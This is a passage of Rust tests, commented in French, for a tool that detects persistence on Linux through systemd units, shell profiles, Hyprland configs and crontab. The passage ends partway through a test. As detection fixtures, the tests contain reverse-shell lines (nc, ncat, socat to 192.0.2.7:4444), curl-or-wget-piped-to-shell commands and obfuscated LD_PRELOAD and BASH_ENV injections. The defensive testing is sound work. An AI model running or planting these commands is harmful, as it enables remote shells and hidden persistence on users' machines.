    /// Vérification 4, D1 : le parcours d'un dossier d'unités suit l'ordre des noms, pas celui du système de fichiers
    /// (l'ordre de création sur btrfs, un hachage sur ext4). Les fichiers sont créés dans un ordre mêlé ; sans le tri,
    /// ils revenaient tels que le disque les rend, et le premier refus d'une alerte changeait d'un disque à l'autre.
    #[test]
    fn parcours_dans_l_ordre_des_noms() {
        let m = Maison::nouvelle("ordre-des-noms");
        let dossier = m.chemin(".config/systemd/user");
        // 7 et 32 sont premiers entre eux : chaque numéro une fois, dans un ordre ni croissant ni décroissant.
        for i in 0..32_u32 {
            let n = i.wrapping_mul(7) % 32;
            m.ecrire(&format!(".config/systemd/user/u{n:02}.service"), UNITE);
            m.ecrire(&format!(".config/systemd/user/u{n:02}.service.d/x.conf"), "[Unit]\n");
        }
        let lus = fichiers_de(&dossier, &["service", "conf"]);
        let mut attendus = lus.clone();
        attendus.sort();
        assert_eq!(lus.len(), 64);
        assert_eq!(lus, attendus);
        assert!(lus[0].ends_with("u00.service") && lus[1].ends_with("u00.service.d/x.conf"));
    }

    /// Vérification 4, D1 : le verdict d'une maison ne dépend pas de l'ordre où ses fichiers ont été écrits (donc du
    /// disque où elle est) : le même refus, que l'unité soit écrite avant ou après l'ajout qui la redirige.
    #[test]
    fn refus_independant_de_l_ordre_d_ecriture() {
        let ajout = ("service.d/x.conf", "[Service]\nEnvironment=PYTHONPATH=/tmp\n");
        let avant = Maison::nouvelle("ordre-avant");
        avant.ecrire(".config/systemd/user/rappel.service", UNITE);
        avant.ecrire(&format!(".config/systemd/user/{}", ajout.0), ajout.1);
        let apres = Maison::nouvelle("ordre-apres");
        apres.ecrire(&format!(".config/systemd/user/{}", ajout.0), ajout.1);
        apres.ecrire(".config/systemd/user/rappel.service", UNITE);
        for m in [&avant, &apres] {
            m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        }
        let (a, b) = (avant.lancements(), apres.lancements());
        assert_eq!(refus(&a), refus(&b));
        assert_eq!(a.message, b.message);
        assert!(refus(&a).contains("PYTHONPATH"), "{}", refus(&a));
    }

    /// Vérification 4, D1 : une ligne d'unité que la liste permise refuse et que l'ancienne porte (`reglage_suspect`)
    /// lève aussi se montre avec la raison de la liste permise, passée d'abord ; chacune reste levée, jamais
    /// déclarable, et son refus nomme la clé.
    #[test]
    fn reglage_par_la_liste_permise_d_abord() {
        use permise::Ecart;
        let de_la_liste: Vec<&str> = [
            Ecart::Filet,
            Ecart::Forme,
            Ecart::Programme,
            Ecart::Lanceur,
            Ecart::Variable,
            Ecart::Chemin,
            Ecart::Longue,
            Ecart::Directive,
            Ecart::Fichier,
        ]
        .map(Ecart::raison)
        .to_vec();
        for (i, (ligne, cle)) in [
            ("Environment=PYTHONPATH=/tmp", "Environment=PYTHONPATH"),
            ("Environment=LANG=C LD_PRELOAD=/tmp/l.so", "Environment=LD_PRELOAD"),
            ("Environment=PATH=/tmp/.x:/usr/bin", "Environment=PATH"),
            ("ExecSearchPath=/tmp", "ExecSearchPath="),
            ("EnvironmentFile=/tmp/e", "EnvironmentFile="),
            ("WorkingDirectory=/tmp", "WorkingDirectory="),
            ("RootDirectory=/tmp", "RootDirectory="),
            ("StandardInputFile=/tmp/x", "StandardInputFile="),
            ("BindPaths=/tmp/x:/opt/x", "BindPaths="),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("reglage-{i}"));
            let r = Releveur {
                racine: m.racine.clone(),
                maison: m.chemin(""),
                ..Releveur::default()
            };
            assert!(
                reglage_suspect(ligne, &r).is_some(),
                "{ligne} : l'ancienne porte le lève aussi"
            );
            m.ecrire(".config/systemd/user/seul.service", &format!("[Service]\n{ligne}\n"));
            let c = m.lancements();
            assert!(refus(&c).contains(cle), "{ligne} : {}", refus(&c));
            assert!(crate::apprentissage::declarable(&c).is_err(), "{ligne}");
            assert!(
                de_la_liste
                    .iter()
                    .any(|r| c.message.contains(&format!("seul.service:2 : {r}"))),
                "{ligne} : {}",
                c.message
            );
        }
    }

    /// Relecture E, C7 : un shell inversé se lit sans ambiguïté, mais ne se déclare jamais normal.
    #[test]
    fn porte_derobee_jamais_declarable() {
        for ligne in [
            "ExecStart=/usr/bin/nc -e /bin/sh 192.0.2.7 4444",
            "ExecStart=/usr/bin/ncat --sh-exec=/bin/sh 192.0.2.7 4444",
            "ExecStart=/usr/bin/socat TCP:192.0.2.7:4444 EXEC:/bin/sh",
        ] {
            let m = Maison::nouvelle(&format!("porte-{}", ligne.len()));
            m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{ligne}\n"));
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{ligne}");
            assert!(refus(&c).contains("porte dérobée"), "{ligne} : {}", refus(&c));
        }
    }

    /// Relecture E, B2 : « bash script » lie le script, pas seulement bash ; M3 : une ligne Lua qui colle autre chose
    /// à la commande ne se déclare pas ; M9 : une unité qui n'est pas de l'UTF-8 se lit quand même.
    #[test]
    fn scripts_lua_et_octets() {
        let m = Maison::nouvelle("script");
        m.ecrire(
            ".config/systemd/user/rappel.service",
            "[Service]\nExecStart=/usr/bin/bash %h/.cache-x/rappel.sh\n",
        );
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "le script caché est signalé");
        let lignes = c.temoins().lignes();
        let chemins: Vec<&str> = lignes[0].cibles.iter().map(|c| c.chemin.as_str()).collect();
        assert_eq!(chemins, ["/usr/bin/bash", "~/.cache-x/rappel.sh", ENVIRONNEMENT]);
        assert!(lignes[0].cibles[1].apercu.is_some(), "le script se montre");
        let declare = c;
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl http://192.0.2.7/x\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));

        let m = Maison::nouvelle("lua");
        m.ecrire(
            ".config/hypr/autostart.lua",
            "o.exec_on_start(\"/tmp/x/run\" .. suffixe)\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(refus(&c).contains("ambiguïté"), "{}", refus(&c));
        m.ecrire(".config/hypr/autostart.lua", "o.exec_on_start(\"/tmp/x/run\")\n");
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());

        let m = Maison::nouvelle("octets");
        let p = m.chemin(".config/systemd/user/a.service");
        std::fs::write(&p, b"[Unit]\nDescription=caf\xe9\n[Service]\nExecStart=/tmp/.x/a\n").unwrap();
        assert_eq!(m.lancements().probleme, Some(Niveau::Eleve));
    }

    /// M9 : un tube nommé à la place d'un fichier lu est dit, jamais compté comme sain (ni attendu : il bloquerait).
    #[test]
    fn tube_a_la_place_d_un_fichier() {
        let m = Maison::nouvelle("tube");
        let p = m.chemin(".bashrc");
        if !std::process::Command::new("mkfifo")
            .arg(&p)
            .status()
            .is_ok_and(|s| s.success())
        {
            return crate::essais::saute("mkfifo absent");
        }
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(c.message.contains("non vérifié"), "{}", c.message);
    }

    /// M7 : un service système ajouté à la main lie ce qu'il lance ; changé, son information revient.
    #[test]
    fn service_ajoute_lie_son_programme() {
        let m = Maison::nouvelle("service");
        let unite = m.racine.join("etc/systemd/system/sauvegarde.service");
        std::fs::create_dir_all(unite.parent().unwrap()).unwrap();
        std::fs::write(&unite, "[Service]\nExecStart=/opt/sauvegarde/lancer --nuit\n").unwrap();
        let programme = m.racine.join("opt/sauvegarde/lancer");
        std::fs::create_dir_all(programme.parent().unwrap()).unwrap();
        std::fs::write(&programme, "#!/bin/sh\nrestic backup\n").unwrap();
        let mut r = Releveur {
            racine: m.racine.clone(),
            maison: m.chemin(""),
            ..Releveur::default()
        };
        assert!(
            temoin_de_service(&mut r, &unite).is_err(),
            "sans l'environnement relevé, rien ne se lie"
        );
        r.environnement = Some(environnement(&r, Vec::new(), Vec::new()).0);
        let avant = temoin_de_service(&mut r, &unite).unwrap();
        assert_eq!(avant.cibles.len(), 2);
        assert_eq!(avant.cibles[1].chemin, ENVIRONNEMENT);
        assert_eq!(avant.cibles[0].chemin, "/opt/sauvegarde/lancer");
        std::fs::write(&programme, "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        let apres = temoin_de_service(&mut r, &unite).unwrap();
        assert_ne!(avant.trace, apres.trace);
    }

    /// Les dossiers d'ajout d'une unité, comme les cherche systemd.
    #[test]
    fn noms_des_ajouts() {
        assert_eq!(
            ajouts_de("a-b-c.service"),
            ["a-.service.d", "a-b-.service.d", "a-b-c.service.d", "service.d"]
        );
        assert_eq!(ajouts_de("x@1.service"), ["service.d", "x@.service.d", "x@1.service.d"]);
        assert!(directive_refusee("[Service]\nEnvironment=LANG=C TZ=UTC\n").is_none());
        assert!(directive_refusee("# EnvironmentFile=/x\n").is_none());
        assert_eq!(
            directive_refusee("[Service]\nEnvironment='LANG=1' \\\n# note\n  \"PATH=/tmp\"\n").as_deref(),
            Some("Environment=PATH")
        );
        // Vérification de la campagne E, N3 : systemd enlève les guillemets et décode « \xNN » avant de lire le
        // nom ; seule une courte liste de noms connus passe, et une barre oblique inversée n'est jamais lue.
        for (texte, attendu) in [
            ("[Service]\nEnvironment=PYTHON\\x5fPATH=/tmp\n", "Environment=\\…"),
            (
                "[Service]\nEnvironment=\"LANG=C\" \"PYTHON\"PATH=/tmp\n",
                "Environment=PYTHONPATH",
            ),
            (
                "[Service]\nEnvironment=\"LD_PRE\"LOAD=/tmp/a.so\n",
                "Environment=LD_PRELOAD",
            ),
            ("[Service]\nEnvironment=GTK_MODULES=x\n", "Environment=GTK_MODULES"),
            ("[Service]\nEnvironment=\"LANG=C\n", "Environment"),
            (
                "[Service]\nPassEnvironment=BASH_FUNC_x%%\n",
                "PassEnvironment=BASH_FUNC_x%%",
            ),
            ("[Service]\nWorkingDirectory=/tmp\n", "WorkingDirectory"),
        ] {
            let vu = directive_refusee(texte);
            assert!(
                vu.as_deref().is_some_and(|v| v.starts_with(attendu)),
                "{texte:?} : {vu:?}"
            );
        }
        assert!(directive_refusee("[Service]\nEnvironment=\"LANG=C\" LC_ALL=C TZ=UTC NO_COLOR=1\n").is_none());
    }

    /// Le témoin d'environnement d'une ligne déclarable, tel qu'il se montre.
    fn apercu_de_l_environnement(c: &Constat) -> Vec<String> {
        let t = c.temoins();
        let ligne = t.lignes().into_iter().next().expect("une ligne relevée");
        ligne
            .cibles
            .iter()
            .find(|x| x.chemin == ENVIRONNEMENT)
            .and_then(|x| x.apercu.clone())
            .expect("l'environnement se montre")
    }

    /// Deuxième vérification de la campagne E, P2 : chaque ligne Exec de l'unité est montrée et liée avec la ligne
    /// signalée ; le programme d'un ExecStartPre= changé après le choix fait revenir l'alerte.
    #[test]
    fn autres_lignes_exec_liees() {
        let m = Maison::nouvelle("exec-liees");
        m.ecrire(
            ".config/systemd/user/rappel.service",
            "[Service]\nType=oneshot\nExecStartPre=/opt/outil/avant\nExecStart=%h/.cache-x/rappel.sh\nExecStopPost=/opt/outil/apres --fin\n",
        );
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        let opt = m.racine.join("opt/outil");
        std::fs::create_dir_all(&opt).unwrap();
        std::fs::write(opt.join("avant"), "#!/bin/sh\necho avant\n").unwrap();
        std::fs::write(opt.join("apres"), "#!/bin/sh\necho apres\n").unwrap();
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            declare.message
        );
        let t = declare.temoins();
        let chemins: Vec<String> = t
            .lignes()
            .iter()
            .flat_map(|l| l.cibles.iter().map(|c| c.chemin.clone()))
            .collect();
        for attendu in ["ExecStartPre=/opt/outil/avant → /opt/outil/avant", "ExecStopPost="] {
            assert!(
                chemins.iter().any(|c| c.starts_with(attendu)),
                "{attendu} : {chemins:?}"
            );
        }
        assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()));
        std::fs::write(opt.join("avant"), "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
        // Une ligne Exec d'un ajout, aussi.
        let m = maison_avec_rappel("exec-ajout");
        std::fs::create_dir_all(m.racine.join("opt")).unwrap();
        std::fs::write(m.racine.join("opt/etape"), "#!/bin/sh\necho etape\n").unwrap();
        m.ecrire(
            ".config/systemd/user/rappel.service.d/x.conf",
            "[Service]\nExecStartPost=/opt/etape\n",
        );
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            refus(&declare)
        );
        std::fs::write(m.racine.join("opt/etape"), "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
    }

    /// Deuxième vérification de la campagne E, P2 : une unité ne se déclare normale que si chaque directive est de
    /// la courte liste permise ; tout le reste (espaces de noms, accréditations, PAM, unités lancées en cas d'échec,
    /// remise à zéro d'ExecStart=, dépendance vers un service, valeur qui est un chemin) est refusé.
    #[test]
    fn directives_hors_liste_refusees() {
        for (i, (texte, attendu)) in [
            ("[Service]\nPrivateTmp=yes\n", "PrivateTmp="),
            ("[Unit]\nJoinsNamespaceOf=autre.service\n", "JoinsNamespaceOf="),
            ("[Service]\nLoadCredential=cle:/tmp/c\n", "LoadCredential="),
            (
                "[Service]\nLoadCredentialEncrypted=cle:/tmp/c\n",
                "LoadCredentialEncrypted=",
            ),
            ("[Service]\nPAMName=login\n", "PAMName="),
            ("[Unit]\nOnFailure=autre.service\n", "OnFailure="),
            ("[Unit]\nOnSuccess=autre.service\n", "OnSuccess="),
            ("[Service]\nUnsetEnvironment=PATH\n", "UnsetEnvironment="),
            ("[Service]\nExecStart=\n", "ExecStart= ("),
            ("[Unit]\nWants=autre.service\n", "Wants=autre.service"),
            ("[Install]\nWantedBy=autre.service\n", "WantedBy=autre.service"),
            ("[Service]\nEnvironment=LC_ALL=/tmp/l\n", "Environment=LC_ALL"),
            ("[Service]\nEnvironment=TZ=../../tmp/z\n", "Environment=TZ"),
            ("[Socket]\nListenStream=4444\n", "[Socket]"),
            ("[Service]\nBindPaths=/tmp:/opt\n", "BindPaths="),
            ("[Service]\nsans égal\n", "sans égal"),
        ]
        .into_iter()
        .enumerate()
        {
            assert!(
                directive_refusee(texte)
                    .as_deref()
                    .is_some_and(|v| v.starts_with(attendu)),
                "{texte:?} : {:?}",
                directive_refusee(texte)
            );
            let m = maison_avec_rappel(&format!("hors-liste-{i}"));
            let declare = m.lancements();
            m.ecrire(".config/systemd/user/rappel.service.d/x.conf", texte);
            let plus_tard = m.lancements();
            assert!(crate::apprentissage::declarable(&plus_tard).is_err(), "{texte:?}");
            assert!(
                refus(&plus_tard).contains("courte liste"),
                "{texte:?} : {}",
                refus(&plus_tard)
            );
            assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard), "{texte:?}");
        }
        for texte in [
            "[Unit]\nDescription=Rappel\nAfter=graphical-session.target\nWants=reseau.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=5\nEnvironment=LANG=fr_CA.UTF-8 TZ=America/Montreal\n\n[Install]\nWantedBy=default.target\n",
            "# rien\n",
        ] {
            assert!(
                directive_refusee(texte).is_none(),
                "{texte:?} : {:?}",
                directive_refusee(texte)
            );
        }
    }

    /// Deuxième vérification de la campagne E, P1 : un fichier des variables qui pose une variable d'injection, même
    /// échappée ou coupée par des guillemets, avant le choix comme après : rien ne se déclare, et le refus nomme le
    /// fichier et la ligne.
    #[test]
    fn variable_d_injection_refusee() {
        for (i, (fichier, texte, attendu)) in [
            (
                ".config/environment.d/50-x.conf",
                "LANG=C\nBASH_ENV=/home/alice/.e\n",
                "~/.config/environment.d/50-x.conf:2",
            ),
            (
                ".config/environment.d/50-x.conf",
                "\\x4cD_PRELOAD=/tmp/l.so\n",
                "~/.config/environment.d/50-x.conf:1",
            ),
            (".profile", "export \"LD_\"'PRELOAD'=/tmp/l.so\n", "~/.profile:1"),
            (".bashrc", "export $'\\x4c'D_PRELOAD=/tmp/l.so\n", "~/.bashrc:1"),
            (".zshenv", "NODE_OPTIONS=--require=/tmp/x.js\n", "~/.zshenv:1"),
            (".bashrc", "unset SHELLOPTS\n", "~/.bashrc:1"),
            (
                ".config/hypr/hyprland.conf",
                "env = GTK_MODULES,x\n",
                "~/.config/hypr/hyprland.conf:1",
            ),
            // Vérification 2 : le dossier d'où Omarchy charge sa bibliothèque Lua.
            (
                ".config/environment.d/50-x.conf",
                "OMARCHY_PATH=/tmp/.x/omarchy\n",
                "~/.config/environment.d/50-x.conf:1",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("injection-{i}"));
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok());
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
            assert!(refus(&c).contains(attendu), "{texte:?} : {}", refus(&c));
            assert!(!crate::apprentissage::essai_tait(&declare, &c), "{texte:?}");
        }
        // Dans un fichier lu par « . » (non jugé ligne à ligne) : « ${NOM:=…} » la pose ; une lecture, non.
        let m = maison_avec_rappel("injection-source");
        m.ecrire(".bashrc", "[ -r ~/.autres/p.sh ] && . ~/.autres/p.sh\n");
        m.ecrire(
            ".autres/p.sh",
            "local o=$SHELLOPTS:$BASHOPTS\n[ -n \"${LD_PRELOAD}${#PYTHONPATH}\" ]\n",
        );
        assert!(
            crate::apprentissage::declarable(&m.lancements()).is_ok(),
            "{}",
            refus(&m.lancements())
        );
        m.ecrire(".autres/p.sh", ": ${LD_PRELOAD:=/tmp/l.so}\n");
        assert!(
            refus(&m.lancements()).contains("~/.autres/p.sh:1"),
            "{}",
            refus(&m.lancements())
        );
        // Un commentaire qui la nomme ne pose rien.
        let m = maison_avec_rappel("injection-commentaire");
        m.ecrire(".profile", "# export LD_PRELOAD=/tmp/l.so\nexport LANG=C\n");
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());
    }

    /// Troisième vérification de la campagne E, V1 : un nom coupé par « \ » en fin de ligne (le lecteur joint la
    /// suivante sans rien entre les deux) se lit joint ; un « . » coupé de même se suit.
    #[test]
    fn nom_coupe_par_une_continuation_refuse() {
        for (i, (fichier, texte, attendu)) in [
            (".profile", "export L\\\nD_PRELOAD=/tmp/l.so\n", "~/.profile:1"),
            (".bashrc", "export B\\\nASH_ENV=/home/alice/.e\n", "~/.bashrc:1"),
            (".bashrc", "declare -x L\\\nD_PRELOAD=/tmp/l.so\n", "~/.bashrc:1"),
            (".bashrc", "LANG=C\nexport L\\  \nD_PRELOAD=/tmp/l.so\n", "~/.bashrc:2"),
            (
                ".config/environment.d/50-x.conf",
                "L\\\nD_PRELOAD=/tmp/l.so\n",
                "~/.config/environment.d/50-x.conf:1",
            ),
            (
                ".config/systemd/user.conf.d/x.conf",
                "[Manager]\nDefaultEnvironment=\\\nLD_PRELOAD=/tmp/l.so\n",
                "~/.config/systemd/user.conf.d/x.conf:3",
            ),
            (
                ".config/systemd/user.conf.d/x.conf",
                "[Manager]\nDefaultEnvironment=B\\\nASH_ENV=/home/alice/.e\n",
                "~/.config/systemd/user.conf.d/x.conf:2",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("coupe-{i}"));
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok());
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
            assert!(refus(&c).contains(attendu), "{texte:?} : {}", refus(&c));
            assert!(!crate::apprentissage::essai_tait(&declare, &c), "{texte:?}");
        }
        let m = maison_avec_rappel("coupe-source");
        m.ecrire(".bashrc", ". \\\n~/.autres/p.sh\n");
        m.ecrire(".autres/p.sh", ": ${LD_PRELOAD:=/tmp/l.so}\n");
        assert!(
            refus(&m.lancements()).contains("~/.autres/p.sh:1"),
            "{}",
            refus(&m.lancements())
        );
    }

    /// Troisième vérification, AWKLIBPATH et VSSCRIPT_PATH : posées par un paquet dans un fichier de root
    /// (/etc/profile.d/gawk.sh), elles passent ; dans un fichier du compte, elles font charger du code : refusées.
    #[test]
    fn variables_de_paquets_refusees_dans_le_compte() {
        for (i, ligne) in ["export AWKLIBPATH=/tmp/a\n", "VSSCRIPT_PATH=/tmp/v\n"]
            .into_iter()
            .enumerate()
        {
            let m = maison_avec_rappel(&format!("paquet-{i}"));
            m.ecrire(".profile", ligne);
            let c = m.lancements();
            assert!(refus(&c).contains("~/.profile:1"), "{ligne:?} : {}", refus(&c));
        }
        assert!(injection_nommee("export AWKLIBPATH=/usr/lib/gawk", true).is_none());
        assert!(injection_nommee("export AWKLIBPATH=/usr/lib/gawk", false).is_some());
        assert!(injection_nommee("export LD_PRELOAD=/x", true).is_some());
        // Dans un espace de noms d'utilisateurs, le propriétaire 0 vu peut être le compte : rien n'est de root seul.
        assert!(uid_sans_traduction("         0          0 4294967295\n"));
        assert!(!uid_sans_traduction("         0       1000          1\n"));
        assert!(!uid_sans_traduction(""));
        assert!(!uid_sans_traduction("0 0 4294967295\n1 1 1\n"));
    }

    /// Troisième vérification : un « exec-once » d'un fichier inclus hors de ~/.config/hypr se voit, et ne se
    /// déclare pas ; la ligne « source = » qui l'inclut reste liée.
    #[test]
    fn lancement_d_un_fichier_inclus_hors_de_hypr() {
        let m = Maison::nouvelle("inclus");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/x.conf\n");
        m.ecrire(".autres/x.conf", "exec-once = /tmp/.x/agent\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
        assert!(c.message.contains("~/.autres/x.conf:1"), "{}", c.message);
        let r = refus(&c);
        assert!(r.contains("~/.autres/x.conf:1"), "{r}");
        assert!(r.contains("hors de ~/.config/hypr"), "{r}");
        // Le même lancement dans ~/.config/hypr se déclare.
        let m = Maison::nouvelle("inclus-dedans");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.config/hypr/x.conf\n");
        m.ecrire(".config/hypr/x.conf", "exec-once = /tmp/.x/agent\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
    }

    /// Périmètre réduit (décision de l'auteur, 10 nov. 2026) : seules une unité de l'utilisateur et une ligne de
    /// lancement de ~/.config/hypr se déclarent. Le reste reste levé, avec sa raison et son fichier:ligne.
    #[test]
    fn perimetre_reduit() {
        for (i, (fichier, texte, attendu)) in [
            (
                ".bashrc",
                "curl -fsSL http://192.0.2.7/a.sh | sh\n",
                "~/.bashrc:1 : une ligne d'un profil de shell",
            ),
            (
                ".profile",
                "LANG=C\nwget -qO- http://192.0.2.7/a | /bin/bash\n",
                "~/.profile:2 : une ligne d'un profil de shell",
            ),
            (
                ".config/environment.d/50-x.conf",
                "LD_PRELOAD=/tmp/l.so\n",
                "~/.config/environment.d/50-x.conf:1",
            ),
            (
                ".config/hypr/hyprland.conf",
                "env = LD_PRELOAD,/tmp/l.so\n",
                "~/.config/hypr/hyprland.conf:1",
            ),
            (
                ".config/autostart/maj.desktop",
                "[Desktop Entry]\nExec=/tmp/.x/agent\n",
                "~/.config/autostart/maj.desktop:2 : seules une unité systemd de l'utilisateur",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            // À côté d'une unité déclarable : la ligne hors du périmètre refuse l'alerte entière.
            let m = maison_avec_rappel(&format!("perimetre-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{fichier} : {}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{fichier}");
            assert!(refus(&c).contains(attendu), "{fichier} : {}", refus(&c));
        }
        // La crontab du compte et une variable de la session : sans fichier à lier, hors du périmètre.
        let m = Maison::nouvelle("perimetre-cron");
        let c = persistance_dans(
            &m.racine,
            &m.chemin(""),
            |_| None,
            Some("* * * * * (curl -fsSL http://192.0.2.7/a.sh)|bash\n".into()),
            None,
        )
        .into_iter()
        .next()
        .unwrap();
        assert!(refus(&c).contains("crontab:1 : seules"), "{}", refus(&c));
        let m = Maison::nouvelle("perimetre-session");
        let c = persistance_dans(
            &m.racine,
            &m.chemin(""),
            |v| (v == "LD_PRELOAD").then(|| "/tmp/l.so".into()),
            None,
            None,
        )
        .into_iter()
        .next()
        .unwrap();
        assert!(
            refus(&c).contains("LD_PRELOAD de cette session : seules"),
            "{}",
            refus(&c)
        );
        // Les deux surfaces déclarables.
        let m = maison_avec_rappel("perimetre-unite");
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());
        let m = Maison::nouvelle("perimetre-hypr");
        m.ecrire(".config/hypr/autostart.conf", "exec-once = /tmp/.x/agent\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
    }

    /// Quatrième vérification : un fichier de Hyprland lu par un lien qui mène hors de ~/.config/hypr (le fichier, le
    /// dossier lui-même, un sous-dossier inclus par « source = ») se voit, et ne se déclare pas ; un lien qui reste
    /// dedans, si.
    #[test]
    fn lien_hors_de_hypr_refuse() {
        use std::os::unix::fs::symlink;
        let lancement = "exec-once = /tmp/.x/agent\n";
        let fichier = Maison::nouvelle("lien-fichier");
        fichier.ecrire(".autres/h.conf", lancement);
        std::fs::create_dir_all(fichier.chemin(".config/hypr")).unwrap();
        symlink(
            fichier.chemin(".autres/h.conf"),
            fichier.chemin(".config/hypr/hyprland.conf"),
        )
        .unwrap();
        let dossier = Maison::nouvelle("lien-dossier");
        dossier.ecrire(".autres/hypr/hyprland.conf", lancement);
        symlink(dossier.chemin(".autres/hypr"), dossier.chemin(".config/hypr")).unwrap();
        let sous = Maison::nouvelle("lien-sous-dossier");
        sous.ecrire(".config/hypr/hyprland.conf", "source = ~/.config/hypr/sous/x.conf\n");
        sous.ecrire(".autres/sous/x.conf", lancement);
        symlink(sous.chemin(".autres/sous"), sous.chemin(".config/hypr/sous")).unwrap();
        for m in [&fichier, &dossier, &sous] {
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{}", c.message);
            let r = refus(&c);
            // Un sous-dossier en lien se dit aussi pour lui-même (deuxième vérification, N10).
            assert!(
                r.contains("lien qui mène hors de ~/.config/hypr")
                    || r.contains("dossier de modules de Hyprland qui est un lien"),
                "{r}"
            );
        }
        let dedans = Maison::nouvelle("lien-dedans");
        dedans.ecrire(".config/hypr/vrai.conf", lancement);
        symlink(
            dedans.chemin(".config/hypr/vrai.conf"),
            dedans.chemin(".config/hypr/hyprland.conf"),
        )
        .unwrap();
        let c = dedans.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
    }

    /// Quatrième vérification : une unité de /etc/systemd/user ne se déclare que si seul root peut la changer ; à la
    /// racine fabriquée, à alice, elle est refusée.
    #[test]
    fn unite_de_etc_systemd_user_a_root_seul() {
        let m = Maison::nouvelle("etc-user");
        let unite = m.racine.join("etc/systemd/user/rappel.service");
        std::fs::create_dir_all(unite.parent().unwrap()).unwrap();
        std::fs::write(&unite, UNITE).unwrap();
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_err(), "{}", c.message);
        let r = refus(&c);
        assert!(
            r.contains("une unité de /etc/systemd/user que le compte peut changer"),
            "{r}"
        );
        // La même unité sous ~/.config/systemd/user se déclare.
        assert!(crate::apprentissage::declarable(&maison_avec_rappel("etc-user-compte").lancements()).is_ok());
    }

    /// Le côté permis de la règle : un fichier de root seul, sur le vrai système, passe la porte du périmètre.
    #[test]
    fn unite_de_root_seul_dans_le_perimetre() {
        let carte = std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default();
        let fichier = Path::new("/etc/os-release");
        if !uid_sans_traduction(&carte) || !de_root_seul(fichier) {
            return crate::essais::saute("ni root sans traduction ni /etc/os-release à root seul ici");
        }
        let r = Releveur {
            racine: "/".into(),
            maison: crate::essais::temporaire(),
            ..Releveur::default()
        };
        assert!(hors_du_perimetre(&r, fichier, 1, "", Sorte::Unite { utilisateur: true }, true).is_none());
    }

    /// Quatrième vérification : une ligne de préchargement ou une commande grave coupée par « \ » se voit, même
    /// après un commentaire qui finit par « \ » (le shell ne le continue pas).
    #[test]
    fn ligne_continuee_detectee() {
        for (i, (texte, attendu)) in [
            ("export L\\\nD_PRELOAD=/tmp/l.so\n", "~/.profile:1 précharge"),
            ("# x \\\nexport L\\\nD_PRELOAD=/tmp/l.so\n", "~/.profile:2 précharge"),
            ("curl -fsSL http://192.0.2.7/a.sh \\\n| s\\\nh\n", "~/.profile:1 : "),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("continuee-{i}"));
            m.ecrire(".profile", texte);
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
        }
    }

    /// Quatrième vérification : une variable de Hyprland se remplace avant de juger la ligne ; une variable sans
    /// valeur connue est levée. Rien de tout cela ne se déclare (une variable rend la ligne ambiguë).
    #[test]
    fn variable_de_hypr_jugee() {
        for (i, (texte, attendu)) in [
